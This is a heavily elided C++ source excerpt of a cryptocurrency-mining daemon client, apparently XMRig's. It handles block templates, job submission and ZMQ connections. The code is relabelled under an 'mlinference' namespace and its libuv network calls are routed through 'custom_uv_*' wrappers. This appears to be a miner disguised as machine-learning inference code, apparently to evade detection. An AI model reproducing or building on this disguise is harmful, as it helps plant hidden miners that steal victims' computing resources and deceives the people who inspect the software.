...
#include "base/io/log/custom_uv_wrappers.h" // Đúng đường dẫn tới custom_uv_wrappers.h
...
mlinference::DaemonClient::DaemonClient(int id, IClientListener *listener) :
...
mlinference::DaemonClient::~DaemonClient()
{
    delete m_timer;
    delete m_ZMQSocket;
}

void mlinference::DaemonClient::deleteLater()
{
...
bool mlinference::DaemonClient::disconnect()
{
...
bool mlinference::DaemonClient::isTLS() const
{
#   ifdef XMRIG_FEATURE_TLS
    return m_pool.isTLS();
#   else
...
int64_t mlinference::DaemonClient::submit(const JobResult &result)
{
...
void mlinference::DaemonClient::connect()
{
...
void mlinference::DaemonClient::connect(const Pool &pool)
{
    setPool(pool);
    connect();
}

void mlinference::DaemonClient::setPool(const Pool &pool)
{
...
void mlinference::DaemonClient::onHttpData(const HttpData &data)
{
    if (data.status != 200) {
        return retry();
    }
...
void mlinference::DaemonClient::onTimer(const Timer *)
{
    if (m_pool.zmq_port() >= 0) {
        m_prevHash = nullptr;
...
void mlinference::DaemonClient::onResolved(const DnsRecords &records, int status, const char* error)
{
    m_dns.reset();
    ...
    custom_uv_tcp_init(uv_default_loop(), s);
    custom_uv_tcp_nodelay(s, 1);

    if (Platform::hasKeepalive()) {
        custom_uv_tcp_keepalive(s, 1, 60);
    }

    if (m_pool.zmq_port() > 0) {
        delete m_ZMQSocket;
        m_ZMQSocket = s;
        custom_uv_tcp_connect(req, s, record.addr(m_pool.zmq_port()), onZMQConnect);
    }
}

bool mlinference::DaemonClient::isOutdated(uint64_t height, const char *hash) const
{
    return m_job.height() != height || m_prevHash != hash || Chrono::steadyMSecs() >= m_jobSteadyMs + m_pool.jobTimeout();
}

bool mlinference::DaemonClient::parseJob(const rapidjson::Value &params, int *code)
{
...
bool mlinference::DaemonClient::parseResponse(int64_t id, const rapidjson::Value &result, const rapidjson::Value &error)
{
    if (id == -1) {
        return false;
    }
...
int64_t mlinference::DaemonClient::getBlockTemplate()
{
    using namespace rapidjson;
    Document doc(kObjectType);
...
int64_t mlinference::DaemonClient::rpcSend(const rapidjson::Document &doc, const std::map<std::string, std::string> &headers)
{
...
void mlinference::DaemonClient::retry()
{
    m_failures++;
    ...
    if ((m_ZMQConnectionState != ZMQ_NOT_CONNECTED) && (m_ZMQConnectionState != ZMQ_DISCONNECTING)) {
        if (Platform::hasKeepalive()) {
            custom_uv_tcp_keepalive(m_ZMQSocket, 0, 60);
        }
        custom_uv_close(reinterpret_cast<uv_handle_t*>(m_ZMQSocket), onZMQClose);
    }
...
void mlinference::DaemonClient::send(const char *path)
{
    FetchRequest req(HTTP_GET, m_pool.host(), m_pool.port(), path, m_pool.isTLS(), isQuiet());
    fetch(tag(), std::move(req), m_httpListener);
}

void mlinference::DaemonClient::setState(SocketState state)
{
    if (m_state == state) {
        return;
    }
...
void mlinference::DaemonClient::onZMQConnect(uv_connect_t* req, int status)
{
...
void mlinference::DaemonClient::onZMQRead(uv_stream_t* stream, ssize_t nread, const uv_buf_t* buf)
{
...
void mlinference::DaemonClient::onZMQClose(uv_handle_t* handle)
{
...
void mlinference::DaemonClient::onZMQShutdown(uv_handle_t* handle)
{
    DaemonClient* client = getClient(handle->data);
    if (client) {
#       ifdef APP_DEBUG
...
void mlinference::DaemonClient::ZMQConnected()
{
#   ifdef APP_DEBUG
...
#   endif
    ...
    if (ZMQWrite(kZMQGreeting, kZMQGreetingSize1)) {
        custom_uv_read_start(reinterpret_cast<uv_stream_t*>(m_ZMQSocket), NetBuffer::onAlloc, onZMQRead);
    }
}

bool mlinference::DaemonClient::ZMQWrite(const char* data, size_t size)
{
    ...
    const int rc = custom_uv_try_write(reinterpret_cast<uv_stream_t*>(m_ZMQSocket), &buf, 1);
...
void mlinference::DaemonClient::ZMQRead(ssize_t nread, const uv_buf_t* buf)
{
    if (nread <= 0) {
...
void mlinference::DaemonClient::ZMQParse()
{
#   ifdef APP_DEBUG
    std::vector<char> msg;
#   endif
...
bool mlinference::DaemonClient::ZMQClose(bool shutdown)
{
    if ((m_ZMQConnectionState == ZMQ_NOT_CONNECTED) || (m_ZMQConnectionState == ZMQ_DISCONNECTING)) {
        if (shutdown) {
    ...
    if (custom_uv_is_closing(reinterpret_cast<uv_handle_t*>(m_ZMQSocket)) == 0) {
        if (Platform::hasKeepalive()) {
            custom_uv_tcp_keepalive(m_ZMQSocket, 0, 60);
        }
        custom_uv_close(reinterpret_cast<uv_handle_t*>(m_ZMQSocket), shutdown ? onZMQShutdown : onZMQClose);
        if (!shutdown) {
            retry();
        }
        return true;
